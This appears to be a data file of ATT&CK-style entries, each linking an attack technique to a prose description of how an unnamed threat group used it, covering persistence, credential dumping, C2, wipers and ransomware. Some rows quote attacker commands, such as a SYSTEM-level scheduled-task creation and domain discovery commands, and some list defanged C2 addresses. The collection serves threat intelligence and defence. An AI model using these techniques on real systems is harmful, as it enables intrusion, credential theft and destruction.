Steal Application Access Token,has used several malicious applications to steal user OAuth access tokens including applications masquerading as Google Defender Google Email Protection and Google Scanner for Gmail users. They also targeted Yahoo users with applications masquerading as Delivery Service and McAfee Email Protection.,relationship
Hidden Window,has used the WindowStyle parameter to conceal  windows. ,relationship
Web Protocols,Later implants used by  such as  use a blend of HTTP and other legitimate channels for C2 depending on module configuration.,relationship
OS Credential Dumping,regularly deploys both publicly available (ex: ) and custom password retrieval tools on victims.,relationship
Password Spraying,has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks.,relationship
Password Guessing,has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days. ,relationship
Network Denial of Service,In 2016  conducted a distributed denial of service (DDoS) attack against the World Anti-Doping Agency.,relationship
Exploit Public-Facing Application,has conducted SQL injection attacks against organizations' external websites. ,relationship
Domains,registered domains imitating NATO OSCE security websites Caucasus information resources and other organizations. ,relationship
Registry Run Keys / Startup Folder,added Registry Run keys to establish persistence.,relationship
Exploitation for Client Execution,has used multiple software exploits for common client software like Microsoft Word and Adobe Reader to gain code execution as part of.,relationship
Accessibility Features,used sticky-keys to obtain unauthenticated privileged console access.,relationship
Bypass User Account Control,has bypassed UAC.,relationship
PowerShell,has used encoded PowerShell scripts uploaded to  installations to download and install .  also used PowerShell scripts to evade defenses.,relationship
Malicious File,has used various forms of spearphishing attempting to get a user to open links or attachments including but not limited to malicious Microsoft Word documents .pdf and .lnk files.  ,relationship
Windows Management Instrumentation Event Subscription,has used WMI to establish persistence.,relationship
Software Packing,used UPX to pack files.,relationship
Multi-hop Proxy,A backdoor used by  created a Tor hidden service to forward traffic from the Tor client to local ports 3389 (RDP) 139 (Netbios) and 445 (SMB) enabling full remote access from outside the network.,relationship
Spearphishing Attachment,has used spearphishing emails with an attachment to deliver files with exploits to initial victims.,relationship
Windows Management Instrumentation,used WMI to steal credentials and execute backdoors at a future time.,relationship
Pass the Ticket,used Kerberos ticket attacks for lateral movement.,relationship
Domain Fronting,has used the meek domain fronting plugin for Tor to hide the destination of C2 traffic.,relationship
File Deletion,used  to remove artifacts from victims.,relationship
Non-Application Layer Protocol,uses TCP for C2 communications.,relationship
Spearphishing Link,has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.,relationship
Rundll32,has used rundll32.exe for execution.,relationship
Obfuscated Files or Information,uses PowerShell to use Base64 for obfuscation.,relationship
Scheduled Task,used named and hijacked scheduled tasks to establish persistence.,relationship
Commonly Used Port,has used Port Number 443 for C2.,relationship
Shortcut Modification,drops a Windows shortcut file for execution.,relationship
Domain Accounts,has used valid accounts including administrator accounts to help facilitate lateral movement on compromised networks.,relationship
Steganography,has used steganography to hide C2 communications in images.,relationship
Bidirectional Communication,has used social media platforms to hide communications to C2 servers.,relationship
Python,has developed malware variants written in Python.,relationship
Exploit Public-Facing Application,has exploited CVE-2019-19781 for Citrix CVE-2019-11510 for Pulse Secure VPNs CVE-2018-13379 for FortiGate VPNs and CVE-2019-9670 in Zimbra software to gain access.,relationship
Web Services,has registered algorithmically generated Twitter handles that are used for C2 by malware such as .,relationship
Digital Certificates,has created self-signed digital certificates to enable mutual TLS authentication for malware.,relationship
Local Data Staging,has been known to stage files for exfiltration in a single location.,relationship
Local Account,has used a tool that can obtain info about local and global group users power users and administrators.,relationship
Keylogging,has used a keylogging tool that records keystrokes in encrypted files.,relationship
System Network Configuration Discovery,A keylogging tool used by  gathers network information from the victim including the MAC address IP address WINS DHCP server and gateway.,relationship
Accessibility Features,replaces the Sticky Keys binary C:\Windows\System32\sethc.exe for persistence.,relationship
Remote Desktop Protocol,enables the Remote Desktop Protocol for persistence.  has also interacted with compromised systems to browse and copy files through RDP sessions.,relationship
Data from Local System,will identify Microsoft Office documents on the victim's computer.,relationship
Scheduled Task,An  downloader creates persistence by creating the following scheduled task: schtasks /create /tn mysc /tr C:\Users\Public\test.exe /sc ONLOGON /ru System.,relationship
File and Directory Discovery,has a tool that looks for files and directories on the local file system.,relationship
Ingress Tool Transfer,has a tool that can copy files to remote machines.,relationship
External Proxy,An  downloader establishes SOCKS5 connections for its initial C2.,relationship
Remote System Discovery,has a tool that can detect the existence of remote systems.,relationship
Uncommonly Used Port,An  downloader establishes SOCKS5 connections to two separate IP addresses over TCP port 1913 and TCP port 81.,relationship
Windows Command Shell,An  downloader uses the Windows command cmd.exe /C whoami. The group also uses a tool to execute commands on remote computers.,relationship
Domain Accounts,leverages valid accounts after gaining credentials for use within the victim domain.,relationship
Permission Groups Discovery,has a tool that can enumerate the permissions associated with Windows groups.,relationship
Process Discovery,has a tool that can list out currently running processes.,relationship
LSASS Memory,has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument dig.,relationship
PowerShell,has used PowerShell on victim systems to download and run payloads after exploitation.,relationship
Windows Service,has a tool that creates a new service for persistence.,relationship
Multi-Stage Channels,An  downloader first establishes a SOCKS5 connection to 192.157.198[.]103 using TCP port 1913; once the server response is verified it then requests a connection to 192.184.60[.]229 on TCP port 81.,relationship
System Network Connections Discovery,has a tool that can enumerate current network connections.,relationship
Exfiltration Over C2 Channel,has a tool that exfiltrates data over the C2 channel.,relationship
Rundll32,has a tool that can run DLLs.,relationship
Software Packing,has been known to pack their tools.,relationship
Non-Application Layer Protocol,An  downloader establishes SOCKS5 connections for its initial C2.,relationship
Obfuscated Files or Information,obfuscates files or information to help evade defensive measures.,relationship
System Owner/User Discovery,An  downloader uses the Windows command cmd.exe /C whoami to verify that it is running with the elevated privileges of System.,relationship
Local Account,has been known to create or enable accounts such as support_388945a0.,relationship
Archive via Utility,has used tools to compress data before exfilling it.,relationship
Indicator Removal from Tools,has been known to remove indicators of compromise from tools.,relationship
Commonly Used Port,uses commonly used ports (like HTTPS/443) for command and control.,relationship
System Information Discovery,has a tool that can obtain information about the local system.,relationship
Account Manipulation,has been known to add created accounts to local admin groups to maintain elevated access.,relationship
Registry Run Keys / Startup Folder,places scripts in the startup folder for persistence.,relationship
SMB/Windows Admin Shares,will copy files over to Windows Admin Shares (like ADMIN$) as part of lateral movement.,relationship
DLL Side-Loading,has been known to side load DLLs with a valid version of Chrome with one of their tools.,relationship
Password Cracking,has been known to brute force password hashes to be able to leverage plain text credentials.,relationship
File Deletion,has a tool that can delete files.,relationship
Credentials In Files,has a tool that can locate credentials in files on the file system such as those from Firefox or Chrome.,relationship
Hidden Window,has been known to use -WindowStyle Hidden to conceal  windows.,relationship
Credentials from Web Browsers,has used tools to dump passwords from browsers.,relationship
Malicious File,has relied on users to execute malicious file attachments delivered via spearphishing emails.,relationship
Spearphishing Attachment,has used spearphishing emails with malicious DOC attachments.,relationship
Software Deployment Tools,compromised McAfee ePO to move laterally by distributing malware as a software deployment task.,relationship
Regsvr32,created a  that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory. The group has also used regsvr32 to run their backdoor. ,relationship
System Owner/User Discovery,collected the victim's username and executed the whoami command on the victim's machine.  executed shellcode to collect the username on the victim's machine. ,relationship
Web Shell,has used Web shells to maintain access to victim websites.,relationship
Exploitation for Privilege Escalation,has used CVE-2016-7255 to escalate privileges.,relationship
PowerShell,has used PowerShell-based tools PowerShell one-liners and shellcode loaders for execution.,relationship
Pass the Hash,has used pass the hash for lateral movement.,relationship
NTFS File Attributes,used NTFS alternate data streams to hide their payloads.,relationship
Remote System Discovery,has enumerated DC servers using the command net group Domain Controllers /domain. The group has also used the ping command.,relationship
Timestomp,has used scheduled task raw XML with a backdated timestamp of June 2 2016. The group has also set the creation time of the files dropped by the second stage of the exploit to match the creation time of kernel32.dll. Additionally  has used a random value to modify the timestamp of the file storing the clientID.,relationship
Obfuscated Files or Information,uses the Invoke-Obfuscation framework to obfuscate their PowerShell and also performs other code obfuscation.  has also encoded payloads using Base64 and a framework called Dont-Kill-My-Cat (DKMC).  also encrypts the library used for network exfiltration with AES-256 in CBC mode in their macOS backdoor.,relationship
Clear Windows Event Logs,has cleared select event log entries.,relationship
Binary Padding,includes garbage code to mislead anti-malware software and researchers.,relationship
Ingress Tool Transfer,has added JavaScript to victim websites to download additional frameworks that profile and compromise website visitors.,relationship
Web Protocols,has used JavaScript that communicates over HTTP or HTTPS to attacker controlled domains to download additional frameworks. The group has also used downloaded encrypted payloads over HTTP.,relationship
Spearphishing Link,has sent spearphishing emails containing malicious links.,relationship
System Network Connections Discovery,used the netstat -anpo tcp command to display TCP connections on the victim's machine.,relationship
Scheduled Task,has used scheduled tasks to persist on victim systems.,relationship
Drive-by Compromise,has infected victims by tricking them into visiting compromised watering hole websites.,relationship
System Information Discovery,has collected the OS version and computer name from victims. One of the group's backdoors can also query the Windows Registry to gather system information and another macOS backdoor performs a fingerprint of the machine on its first connection to the C&C server.  executed shellcode to identify the name of the infected host.,relationship
Windows Management Instrumentation,used WMI to deploy their tools on remote machines and to gather information about the Outlook process.,relationship
LSASS Memory,used Mimikatz and customized versions of Windows Credential Dumper to harvest credentials.,relationship
Office Application Startup,have replaced Microsoft Outlook's VbaProject.OTM file to install a backdoor macro for persistence.,relationship
System Network Configuration Discovery,used the ipconfig /all command to gather the IP address from the system.,relationship
Spearphishing Attachment,has sent spearphishing emails with a malicious executable disguised as a document or spreadsheet.,relationship
PubPrn,has used PubPrn.vbs within execution scripts to execute malware possibly bypassing defenses.,relationship
Malicious File,has attempted to lure users to execute a malicious dropper delivered via a spearphishing attachment.,relationship
Local Accounts,has used legitimate local admin account credentials.,relationship
Match Legitimate Name or Location,has renamed a NetCat binary to kb-10233.exe to masquerade as a Windows update.  has also renamed a Cobalt Strike beacon payload to install_flashplayers.exe. ,relationship
Mshta,has used mshta.exe for code execution.,relationship
Custom Command and Control Protocol,uses 's malleable C2 functionality to blend in with network traffic. The group's backdoor can also exfiltrate data by encoding it in the subdomain field of DNS packets. Additionally one of the group's macOS backdoors implements a specific format for the C2 packet involving random values.,relationship
Registry Run Keys / Startup Folder,established persistence using Registry Run keys both to execute PowerShell and VBS scripts as well as to execute their backdoor directly.,relationship
Pass the Ticket,successfully gained remote access by using pass the ticket.,relationship
Network Service Scanning,performed network scanning on the network to search for open ports services OS finger-printing and other vulnerabilities.,relationship
SMB/Windows Admin Shares,used  to use Windows' hidden network shares to copy their tools to remote machines for execution.,relationship
DLL Side-Loading,ran legitimately-signed executables from Symantec and McAfee which load a malicious DLL. The group also side-loads its backdoor by dropping a library and a legitimate signed executable (AcroTranscoder).,relationship
Uncommonly Used Port,backdoor can use HTTP over an uncommon TCP port (e.g 14146) which is specified in the backdoor configuration.,relationship
Exploitation for Client Execution,has used RTF document that includes an exploit to execute malicious code. (CVE-2017-11882),relationship
Exfiltration Over C2 Channel,backdoor has exfiltrated data using the already opened channel with its C&C server.,relationship
File and Directory Discovery,backdoor possesses the capability to list files and directories on a machine. ,relationship
Query Registry,backdoor can query the Windows Registry to gather system information. ,relationship
Archive Collected Data,backdoor has used LZMA compression and RC4 encryption before exfiltration.,relationship
Modify Registry,backdoor has modified the Windows Registry to store the backdoor's configuration. ,relationship
Service Execution,backdoor has used Windows services as a way to execute its malicious payload. ,relationship
Hidden Files and Directories,macOS backdoor hides the clientID file via a chflags function.,relationship
File Deletion,macOS backdoor can receive a delete command.,relationship
Linux and Mac File and Directory Permissions Modification,macOS backdoor changes the permission of the file it wants to execute to 755.,relationship
Windows Command Shell,has used cmd.exe for execution. ,relationship
Hidden Window,has used the WindowStyle parameter to conceal  windows.  ,relationship
Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,backdoor can exfiltrate data by encoding it in the subdomain field of DNS packets.,relationship
Mail Protocols,has used email for C2 via an Office macro.,relationship
Visual Basic,has used macros COM scriptlets and VBS scripts. ,relationship
Masquerade Task or Service,has used hidden or non-printing characters to help masquerade service names such as appending a Unicode no-break space character to a legitimate service name.  has also impersonated the legitimate Flash installer file name install_flashplayer.exe.,relationship
Rename System Utilities,has moved and renamed pubprn.vbs to a .txt file to avoid detection.,relationship
Local Account,enumerated administrative users using the commands net localgroup administrators.,relationship
Credentials in Registry,used Outlook Credential Dumper to harvest credentials stored in Windows registry.,relationship
OS Credential Dumping,used GetPassword_x64 to harvest credentials.,relationship
Windows Service,modified Windows Services to ensure PowerShell scripts were loaded on the system.  also creates a Windows service to establish persistence.,relationship
Non-Standard Port,An  backdoor can use HTTP over a non-standard TCP port (e.g 14146) which is specified in the backdoor configuration.,relationship
Lateral Tool Transfer,has deployed tools after moving laterally using administrative accounts.,relationship
Network Share Discovery,used the net view command to show all shares available including the administrative shares such as C$ and ADMIN$.,relationship
Rundll32,malware has used rundll32.exe to execute an initial infection process.,relationship
Process Injection,malware has injected a Cobalt Strike beacon into Rundll32.exe.,relationship
Malicious Link,has lured targets to download a Cobalt Strike beacon by including a malicious link within spearphishing emails.,relationship
Masquerading,has disguised a Cobalt Strike beacon as a Flash Installer.,relationship
Keylogging,has abused the PasswordChangeNotify to monitor for and capture account password changes.,relationship
Command and Scripting Interpreter,has used COM scriptlets to download Cobalt Strike beacons.,relationship
JavaScript/JScript,has used JavaScript for drive-by downloads and C2 communications.,relationship
Spearphishing Link,has sent spearphishing emails containing links to .hta files.,relationship
Malicious Link,has lured users to click links to malicious HTML applications delivered via spearphishing emails.,relationship
Valid Accounts,has used valid accounts for initial access and privilege escalation.,relationship
Exploitation for Client Execution,has attempted to exploit a known vulnerability in WinRAR (CVE-2018-20250) and attempted to gain remote code execution via a security bypass vulnerability (CVE-2017-11774).,relationship
Network Sniffing,has used SniffPass to collect credentials by sniffing network traffic.,relationship
LSASS Memory,has used a variety of publicly available tools like   and ProcDump to dump credentials.,relationship
Archive via Utility,has used WinRAR to compress data prior to exfil.,relationship
Ingress Tool Transfer,has downloaded additional files and programs from its C2 server.,relationship
PowerShell,has utilized PowerShell to download files from the C2 server and run various scripts. ,relationship
Registry Run Keys / Startup Folder,has deployed a tool known as  to the Startup folder of a victim and used Registry run keys to gain persistence.,relationship
Web Protocols,has used HTTP for command and control.,relationship
Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,has used FTP to exfiltrate files (separately from the C2 channel).,relationship
Uncommonly Used Port,has used ports 808 and 880 for command and control.,relationship
Scheduled Task,has created a scheduled task to execute a .vbe file multiple times a day.,relationship
Standard Encoding,has used base64 to encode command and control traffic.,relationship
Obfuscated Files or Information,has used base64 to encode payloads.,relationship
Symmetric Cryptography,has used AES for encryption of command and control traffic.,relationship
Exploitation for Privilege Escalation,has used a publicly available exploit for CVE-2017-0213 to escalate privileges on a local system.,relationship
Password Spraying,has used password spraying to gain access to target systems.,relationship
Credentials In Files,has used a variety of publicly available tools like  to gather credentials.,relationship
LSA Secrets,has used a variety of publicly available tools like  to gather credentials.,relationship
Cached Domain Credentials,has used a variety of publicly available tools like  to gather credentials.,relationship
Credentials from Web Browsers,has used a variety of publicly available tools like  to gather credentials.,relationship
Credentials from Password Stores,has used a variety of publicly available tools like  to gather credentials.,relationship
Group Policy Preferences,has used a variety of publicly available tools like Gpppassword to gather credentials.,relationship
Non-Standard Port,has used HTTP over TCP ports 808 and 880 for command and control.,relationship
Visual Basic,has used VBScript to initiate the delivery of payloads.,relationship
Cloud Accounts,has used compromised Office 365 accounts in tandem with  in an attempt to gain control of endpoints.,relationship
Spearphishing Attachment,has sent spearphishing e-mails with archive attachments.,relationship
Malicious File,has used malicious e-mail attachments to lure victims into executing malware.,relationship
Windows Management Instrumentation Event Subscription,has attempted to use WMI event subscriptions to establish persistence on compromised hosts.,relationship
Exploitation for Client Execution,has used Flash Player (CVE-2016-4117 CVE-2018-4878) and Word (CVE-2017-0199) exploits for execution.,relationship
Process Discovery,Freenki malware lists running processes using the Microsoft Windows API.,relationship
Data from Local System,has collected data from victims' local systems.,relationship
Malicious File,has sent spearphishing attachments attempting to get a user to open them.,relationship
Windows Command Shell,has used the command-line interface.,relationship
Credentials from Web Browsers,has used a credential stealer known as ZUMKONG that can harvest usernames and passwords stored in browsers.,relationship
System Information Discovery,collects the computer name the BIOS model and execution path.,relationship
System Owner/User Discovery,identifies the victim username.,relationship
Ingress Tool Transfer,has downloaded second stage malware from compromised websites.,relationship
Audio Capture,has used an audio capturing utility known as SOUNDWAVE that captures microphone input.,relationship
Registry Run Keys / Startup Folder,has added persistence via the Registry key HKCU\Software\Microsoft\CurrentVersion\Run\.,relationship
Native API,leverages the Windows API calls: VirtualAlloc() WriteProcessMemory() and CreateRemoteThread() for process injection.,relationship
Custom Command and Control Protocol,credential stealer ZUMKONG emails credentials from the victim using HTTP POST requests.,relationship
Obfuscated Files or Information,obfuscates strings and payloads.,relationship
Spearphishing Attachment,delivers malware using spearphishing emails with malicious HWP attachments.,relationship
Process Injection,injects its malware variant  into the cmd.exe process.,relationship
Drive-by Compromise,has used strategic web compromises particularly of South Korean websites to distribute malware. The group has also used torrent file-sharing sites to more indiscriminately disseminate malware to victims. As part of their compromises the group has used a Javascript based profiler called RICECURRY to profile a victim's web browser and deliver malicious code accordingly.,relationship
Web Protocols,uses HTTPS to conceal C2 communications.,relationship
Disk Structure Wipe,has access to destructive malware that is capable of overwriting a machine's Master Boot Record (MBR).,relationship
Bidirectional Communication,leverages social networking sites and cloud platforms (AOL Twitter Yandex Mediafire pCloud Dropbox and Box) for C2.,relationship
Commonly Used Port,has used port 8080 for C2.,relationship
Invalid Code Signature,has signed its malware with an invalid digital certificates listed as Tencent Technology (Shenzhen) Company Limited.,relationship
Dynamic Data Exchange,has used Windows DDE for execution of commands and a malicious VBS.,relationship
Peripheral Device Discovery,has a Bluetooth device harvester which uses Windows Bluetooth APIs to find information on connected Bluetooth devices. ,relationship
Bypass User Account Control,has a function in the initial dropper to bypass Windows UAC in order to execute the next payload with higher privileges.,relationship
System Shutdown/Reboot,has used malware that will issue the command shutdown /r /t 1 to reboot a system after wiping its MBR.,relationship
Steganography,uses steganography to send images to users that are embedded with shellcode.,relationship
Visual Basic,executes shellcode and a VBA script to decode Base64 strings.,relationship
Web Protocols,used a backdoor QUICKRIDE to communicate to the C2 server over HTTP and HTTPS.,relationship
Keylogging,used a Trojan called KEYLIME to capture keystrokes from the victims machine.,relationship
Process Discovery,leveraged Sysmon to understand the processes services in the organization.,relationship
Modify Registry,uses a tool called CLEANTOAD that has the capability to modify Registry keys.,relationship
Drive-by Compromise,has conducted watering holes schemes to gain initial access to victims.,relationship
Clipboard Data,used a Trojan called KEYLIME to collect data from the clipboard.,relationship
Software Packing,has used several code packing methods such as Themida Enigma VMProtect and Obsidium to pack their implants.,relationship
Windows Command Shell,has used a command-line tunneler NACHOCHEESE to give them shell access to a victims machine.,relationship
Ingress Tool Transfer,used a backdoor NESTEGG that has the capability to download and upload files to and from a victims machine.,relationship
File Deletion,has used a utility called CLOSESHAVE that can securely delete a file from the system.,relationship
Clear Windows Event Logs,clears Window Event logs and Sysmon logs from the system.,relationship
Runtime Data Manipulation,has used DYEPACK.FOX to manipulate PDF data as it is accessed to remove traces of fraudulent SWIFT transactions from the data displayed to the end user.,relationship
Transmitted Data Manipulation,has used DYEPACK to manipulate SWIFT messages en route to a printer.,relationship
Stored Data Manipulation,has used DYEPACK to create delete and alter records in databases used for SWIFT transactions.,relationship
Disk Structure Wipe,has used a custom MBR wiper named BOOTWRECK to render systems inoperable.,relationship
Data Encrypted for Impact,has used Hermes ransomware to encrypt files with AES256.,relationship
Data Destruction,has used a custom secure delete function to make deleted files unrecoverable.,relationship
System Network Connections Discovery,installed a port monitoring tool MAPMAKER to print the active TCP connections on the local system.,relationship
System Shutdown/Reboot,has used a custom MBR wiper named BOOTWRECK which will initiate a system reboot after wiping the victim's MBR.,relationship
Spearphishing Attachment,leveraged spearphishing emails with malicious attachments to initially compromise victims. ,relationship
Spearphishing Link,leveraged spearphishing emails with malicious links to initially compromise victims. ,relationship
Remote Desktop Protocol,has been seen using RDP for lateral movement and persistence in some cases employing the rdpwinst tool for mangement of multiple sessions. ,relationship
Registry Run Keys / Startup Folder,has maintained persistence using the startup folder. ,relationship
Scheduled Task,has created scheduled tasks for persistence. ,relationship
Shortcut Modification,has modified LNK shortcuts. ,relationship
Remote System Discovery,has used nbtscan and custom tools to discover remote systems. ,relationship
Archive via Utility,has used WinRAR and 7-Zip to compress an archive stolen data. ,relationship
Internal Proxy,used custom tools to create SOCK5 and custom protocol proxies between infected hosts. ,relationship
LSASS Memory,has used Mimikatz Windows Credential Editor and ProcDump to dump credentials. ,relationship
Command and Scripting Interpreter,utilized custom scripts to perform internal reconnaissance. ,relationship
Valid Accounts,has used stolen credentials to compromise Outlook Web Access (OWA). ,relationship
Network Service Scanning,has used  and a custom port scanner known as BLUETORCH for network scanning. ,relationship
SSH,used secure shell (SSH) to move laterally among their targets. ,relationship
Web Shell,has installed ANTAK and ASPXSPY web shells. ,relationship
Malicious File,has sent spearphishing emails in an attempt to lure users to click on a malicious attachment. ,relationship
Software Packing,has packed tools with UPX and has repacked a modified version of  to thwart anti-virus detection.,relationship
System Owner/User Discovery,used  to collect usernames from the system. ,relationship
Malicious Link,has sent spearphishing emails in an attempt to lure users to click on a malicious link. ,relationship
Brute Force,has used Ncrack to reveal credentials.,relationship
Credentials from Password Stores,has used the Smartftp Password Decryptor tool to decrypt FTP passwords.,relationship
External Proxy,has used various tools to proxy C2 communications.,relationship
Local Account,has created accounts on multiple compromised hosts to perform actions within the network.,relationship
Service Execution,has used post-exploitation tools including RemCom and the Non-sucking Service Manager (NSSM) to execute processes.,relationship
Network Share Discovery,has used the post exploitation tool  to enumerate network shares.,relationship
PowerShell,has used PowerShell to execute malicious code.,relationship
Bidirectional Communication,has communicated with C2 through files uploaded to DropBox.,relationship
DNS,has used remote access tools that leverage DNS in communications with C2.,relationship
Python,has used a command line utility and a network scanner written in python.,relationship
Web Protocols,has used HTTP in communications with C2.,relationship
OS Credential Dumping,has used different versions of Mimikatz to obtain credentials.,relationship
SMB/Windows Admin Shares,has used SMB for lateral movement.,relationship
Ingress Tool Transfer,has downloaded tools to compromised hosts.,relationship
Clipboard Data,has used tools capable of stealing contents of the clipboard.,relationship
Data from Local System,has used a tool to steal files from the compromised host.,relationship
Keylogging,has used tools for capturing keystrokes.,relationship
Screen Capture,has used a screen capture utility to take screenshots on a compromised host.,relationship
Exploit Public-Facing Application,has used SQL injection for initial compromise.,relationship
Match Legitimate Name or Location,has used a tool named mfevtpse.exe to proxy C2 communications closely mimicking a legitimate McAfee file mfevtps.exe.,relationship
Code Signing,leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations.,relationship
Rootkit,deployed rootkits on Linux systems.,relationship
Bootkit,deployed Master Boot Record bootkits on Windows systems to hide their malware and maintain persistence on victim systems.,relationship
Password Cracking,performed password brute-force attacks on the local admin account.,relationship
Network Service Scanning,used a malware variant called WIDETONE to conduct port scans on the specified subnets.,relationship
Remote Desktop Protocol,used RDP for lateral movement.,relationship
LSASS Memory,used the Windows Credential Editor to dump password hashes from memory and authenticate to other user accounts.,relationship
Accessibility Features,leveraged sticky keys to establish persistence. ,relationship
PowerShell,leveraged PowerShell to deploy malware families in victims environments.,relationship
Match Legitimate Name or Location,attempted to masquerade their files as popular anti-virus software.,relationship
Spearphishing Attachment,sent spearphishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims.,relationship
External Remote Services,compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service.,relationship
Proxy,used a tool called CLASSFON to covertly proxy network communications.,relationship
Domain Generation Algorithms,has used DGAs to change their C2 servers monthly.,relationship
Compromise Software Supply Chain,gained access to production environments where they could inject malicious code into legitimate signed files and widely distribute them to end users.,relationship
Keylogging,used a keylogger called GEARSHIFT on a target system.,relationship
Valid Accounts,used compromised credentials to log on to other systems.,relationship
Windows Management Instrumentation,used WMI in several ways including for execution of commands via WMIEXEC as well as for persistence via .,relationship
System Owner/User Discovery,used the WMIEXEC utility to execute whoami commands on remote machines.,relationship
Registry Run Keys / Startup Folder,created and modified startup files for persistence.  added a registry key in HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost to establish persistence for Cobalt Strike.,relationship
Clear Windows Event Logs,attempted to remove evidence of some of its activity by clearing Windows security and system events.,relationship
Modify Registry,used a malware variant called GOODLUCK to modify the registry in order to steal credentials.,relationship
Archive via Utility,created a RAR archive of targeted files for exfiltration.,relationship
Resource Hijacking,deployed a Monero cryptocurrency mining tool in a victims environment.,relationship
Data Encrypted for Impact,used a ransomware called Encryptor RaaS to encrypt files on the targeted systems and provide a ransom note to the user.,relationship
Clear Command History,attempted to remove evidence of some of its activity by deleting Bash histories.,relationship
Dead Drop Resolver,used legitimate websites for C2 through dead drop resolvers (DDR) including GitHub Pastebin and Microsoft TechNet.,relationship
Windows Service,modified legitimate Windows services to install malware backdoors.  created the StorSyncSvc service to provide persistence for Cobalt Strike.,relationship
Scheduled Task,used a compromised account to create a scheduled task on a system.,relationship
Windows Command Shell,used cmd.exe /c to execute commands on remote machines. used a batch file to install persistence for the  BEACON loader.,relationship
Local Account,created user accounts and adds them to the User and Admin groups. ,relationship
System Network Configuration Discovery,collected MAC addresses from victim machines. ,relationship
DNS,used DNS for C2 communications. ,relationship
Process Injection,malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process.,relationship
Fallback Channels,used the Steam community page as a fallback mechanism for C2. ,relationship
Compiled HTML File,used compiled HTML (.chm) files for targeting. ,relationship
File Deletion,deleted files from the system. ,relationship
DLL Side-Loading,used legitimate executables to perform DLL side-loading of their malware. ,relationship
Exploitation for Client Execution,leveraged the follow exploits in their operations: CVE-2012-0158 CVE-2015-1641 CVE-2017-0199 CVE-2017-11882 and CVE-2019-3396. ,relationship
System Network Connections Discovery,used the netstat command as part of network reconnaissance. The group has also used a malware variant HIGHNOON to enumerate active RDP sessions. ,relationship
Network Share Discovery,used the net share command as part of network reconnaissance.,relationship
Obfuscated Files or Information,used VMProtected binaries in multiple intrusions.,relationship
Ingress Tool Transfer,used  to download additional files.,relationship
Multi-Stage Channels,used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor.,relationship
BITS Jobs,used  to download and install payloads.,relationship
Exploit Public-Facing Application,exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices.,relationship
File Transfer Protocols,used exploit payloads that initiate download via .,relationship
File and Directory Discovery,has executed file /bin/pwd on exploited victims perhaps to return architecture related information.,relationship
Unix Shell,executed file /bin/pwd in activity exploiting CVE-2019-19781 against Citrix devices.,relationship
Service Execution,used  to execute a system service installed to launch a Cobalt Strike BEACON loader.,relationship
Web Protocols,used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits. ,relationship
Environmental Keying,has encrypted payloads using the Data Protection API (DPAPI) which relies on keys tied to specific user accounts on specific machines.  has also environmentally keyed second stage malware with an RC5 key derived in part from the infected system's volume serial number.,relationship
Data Obfuscation,The  group has used other forms of obfuscation include commingling legitimate traffic with communications traffic so that network streams appear legitimate.,relationship
OS Credential Dumping,has been known to dump credentials.,relationship
Exploit Public-Facing Application,has been observed using SQL injection to gain access to systems.,relationship
Accessibility Features,actors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence.,relationship
Remote Desktop Protocol,The  group is known to have used RDP during operations.,relationship
Steganography,Some malware that has been used by  also uses steganography to hide communication in PNG image files.,relationship
Archive via Utility,has compressed data into password-protected RAR archives prior to exfiltration.,relationship
Malicious File,has attempted to get users to launch malicious Microsoft Word attachments delivered via spearphishing emails.,relationship
Bypass User Account Control,has used a Windows 10 specific tool and xxmm to bypass UAC for privilege escalation.,relationship
At (Windows),has used  to register a scheduled task to execute malware during lateral movement.,relationship
Match Legitimate Name or Location,has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.,relationship
Dead Drop Resolver,MSGET downloader uses a dead drop resolver to access malicious payloads.,relationship
File and Directory Discovery,has collected a list of files from the victim and uploaded it to its C2 server and then created a new list of specific files to steal.,relationship
Screen Capture,has used a tool to capture screenshots.,relationship
Web Protocols,malware has used HTTP for C2.,relationship
Drive-by Compromise,compromised three Japanese websites using a Flash exploit to perform watering hole attacks.,relationship
LSASS Memory,has used various tools (such as Mimikatz and WCE) to perform credential dumping.,relationship
Deobfuscate/Decode Files or Information,downloads encoded payloads and decodes them on the victim.,relationship
Domain Account,has used net user /domain to identify account information.,relationship
File Deletion,The  uploader or malware the uploader uses command to delete the RAR archives after they have been exfiltrated.,relationship
Remote System Discovery,typically use ping and  to enumerate systems.,relationship
Data from Local System,has exfiltrated files stolen from local systems.,relationship
System Time Discovery,has used net time to check the local time on a target system.,relationship
Windows Command Shell,has used batch scripts and the command-line interface for execution.,relationship
Exploitation for Client Execution,has exploited Microsoft Office vulnerabilities CVE-2014-4114 CVE-2018-0802 and CVE-2018-0798 for execution.,relationship
Ingress Tool Transfer,has used various tools to download files including DGet (a similar tool to wget).,relationship
Registry Run Keys / Startup Folder,has used a batch script that adds a Registry Run key to establish malware persistence.,relationship
Symmetric Cryptography,has used RC4 encryption (for Datper malware) and AES (for xxmm malware) to obfuscate HTTP traffic.  has also used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server.,relationship
Binary Padding,downloader code has included 0 characters at the end of the file to inflate the file size in a likely attempt to evade anti-virus detection.,relationship
Pass the Ticket,has created forged Kerberos Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) tickets to maintain administrative access.,relationship
Spearphishing Attachment,used spearphishing emails with malicious Microsoft Word attachments to infect victims.,relationship
Standard Encoding,Several  tools encode data with base64 when posting it to a C2 server.,relationship
Data from Network Shared Drive,has exfiltrated files stolen from file shares.,relationship
PowerShell,has used PowerShell for execution.,relationship
